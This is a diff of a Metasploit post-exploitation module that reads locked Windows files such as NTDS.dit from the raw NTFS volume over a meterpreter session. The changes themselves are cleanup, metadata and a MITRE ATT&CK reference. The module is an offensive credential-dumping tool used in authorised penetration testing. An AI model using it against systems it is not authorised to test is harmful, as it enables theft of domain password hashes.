@@ -19,13 +19,19 @@ class MetasploitModule < Msf::Post
           such as open file with write lock. Because it avoids the usual file locking issues, it can
           be used to retrieve files such as NTDS.dit.
         },
-        'License' => 'MSF_LICENSE',
+        'License' => MSF_LICENSE,
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
         'Author' => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz
         'References' => [
-          [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ]
+          [ 'URL', 'http://www.amazon.com/System-Forensic-Analysis-Brian-Carrier/dp/0321268172/' ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1003_003_NTDS ]
         ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -44,9 +50,9 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    winver = sysinfo["OS"]
+    version = get_version_info
 
-    fail_with(Failure::NoTarget, 'Module not valid for Windows 2000') if winver =~ /2000/
+    fail_with(Failure::NoTarget, 'Module not valid for Windows 2000') if version.build_number == Msf::WindowsVersion::Win2000
     fail_with(Failure::NoAccess, 'You don\'t have administrative privileges') unless is_admin?
 
     file_path = datastore['FILE_PATH']
@@ -78,20 +84,20 @@ class MetasploitModule < Msf::Post
     end
 
     @handle = r['return']
-    vprint_good("Successfuly opened #{drive}")
+    vprint_good("Successfully opened #{drive}")
     begin
       @bytes_read = 0
       fs = Rex::Parser::NTFS.new(self)
       print_status("Trying to gather #{file_path}")
       path = file_path[3, file_path.length - 3]
       data = fs.file(path)
-      file_name = file_path.split("\\")[-1]
-      stored_path = store_loot("windows.file", 'application/octet-stream', session, data, file_name, "Windows file")
+      file_name = file_path.split('\\')[-1]
+      stored_path = store_loot('windows.file', 'application/octet-stream', session, data, file_name, 'Windows file')
       print_good("Saving file : #{stored_path}")
     ensure
       client.railgun.kernel32.CloseHandle(@handle)
     end
-    print_status("Post Successful")
+    print_status('Post Successful')
   end
 
   def read(size)
